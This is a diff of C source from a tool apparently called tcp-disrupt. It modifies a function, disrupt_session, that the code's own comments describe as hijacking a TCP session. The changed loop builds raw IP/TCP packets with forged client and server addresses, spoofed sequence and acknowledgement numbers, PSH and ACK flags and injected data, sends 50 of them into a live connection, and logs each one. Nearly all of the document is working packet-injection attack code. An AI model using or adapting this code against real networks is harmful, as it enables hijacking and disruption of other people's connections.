@@ -94,14 +94,14 @@ void display_usage(char *name) {
  *
  * Once the function has been hijacked, and the desired actions have been taken on the hijacked session, this function should exit tcp-disrupt. 
  *
- * @param sourceIP          String representation of the source's IP address.
- * @param sourcePort        The port used by the source in the TCP session being hijacked.
- * @param destinationIP     String representation of the destination's IP address.
- * @param destinationPort   The port used by the destination in the TCP session being hijacked.
+ * @param serverIP          String representation of the source's IP address.
+ * @param serverPort        The port used by the source in the TCP session being hijacked.
+ * @param clientIP     String representation of the destination's IP address.
+ * @param clientPort   The port used by the destination in the TCP session being hijacked.
  * @param sequenceNumber    The sequence number to be acknowledged by the desination.
  * @param ackNumber         The last sequence number acknowledged by the source.
  */
-void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, uint16_t destinationPort, uint32_t sequenceNumber, uint32_t ackNumber, int timestamp, int finalRound) {
+void disrupt_session(char *serverIP, uint16_t serverPort, char *clientIP, uint16_t clientPort, uint32_t sequenceNumber, uint32_t ackNumber, int timestamp, int finalRound) {
     static char packet[ sizeof(struct tcphdr) + sizeof(struct iphdr) + 2 ];
     
     // Socket FD
@@ -134,57 +134,60 @@ void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, u
 
     //Populate address struct
     addr_in.sin_family = AF_INET;
-    addr_in.sin_port = htons(destinationPort);
-    addr_in.sin_addr.s_addr = inet_addr(destinationIP);
+    addr_in.sin_port = htons(clientPort);
+    addr_in.sin_addr.s_addr = inet_addr(clientIP);
 
 
-int z = 50;
-while(z--){
-    fill_packet(destinationIP,
-                sourceIP,
-                sourcePort,
-                destinationPort,
-                SYN_OFF,
-                ACK_ON,
-                ackNumber++,
-                sequenceNumber,
-                RESET_OFF,
-                "Q",
-                packet,
-                sizeof(struct tcphdr) + sizeof(struct iphdr) + 2 + 12);
+    int z = 50;
+    while(z--){
+        printf("Sending {\"srcIP\":\"%s\", \"dstIP\":\"%s\", \"dstPort\":%d, \"srcPort\":%d, \"SYN\":%d, \"ACK\":%d, \"ACK_NUM\":%u, \"SYN_NUM\":%u, \"RST\":%d, \"data\":\"%s\"}", 
+            clientIP, serverIP, serverPort, clientPort, SYN_OFF, ACK_ON, ackNumber+ack_inc, sequenceNumber+seq_inc, RESET_OFF, "X");
+        fill_packet(serverIP,
+                    clientIP,
+                    clientPort,
+                    serverPort,
+                    SYN_OFF,
+                    ACK_ON,
+                    PSH_ON,
+                    ackNumber + ack_inc,
+                    sequenceNumber + seq_inc,
+                    RESET_OFF,
+                    "X",
+                    packet,
+                    sizeof(struct tcphdr) + sizeof(struct iphdr) + 2 + 12);
 
-    char *nopPtr = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x08;
-    nopPtr++;
-    *nopPtr = 0x0a;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 'Q';
-    nopPtr++;
-    *nopPtr = '\0';
+        char *nopPtr = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
+        *nopPtr = 0x01;
+        nopPtr++;
+        *nopPtr = 0x01;
+        nopPtr++;
+        *nopPtr = 0x08;
+        nopPtr++;
+        *nopPtr = 0x0a;
+        nopPtr++;
+        *nopPtr = 0x01;
+        nopPtr++;
+        *nopPtr = 0x01;
+        nopPtr++;
+        *nopPtr = 0x01;
+        nopPtr++;
+        *nopPtr = 0x01;
+        nopPtr++;
+        *nopPtr = 0x01;
+        nopPtr++;
+        *nopPtr = 0x01;
+        nopPtr++;
+        *nopPtr = 0x01;
+        nopPtr++;
+        *nopPtr = 0x01;
+        nopPtr++;
+        *nopPtr = 'Q';
+        nopPtr++;
+        *nopPtr = '\0';
 
-    // Send out the packet
-    send_packet(sock, packet, addr_in);
-}
+        // Send out the packet
+        printf("Sending Packet! Result: %d\n", send_packet(sock, packet, addr_in));
+    }
 
     if(finalRound){
         exit(0);
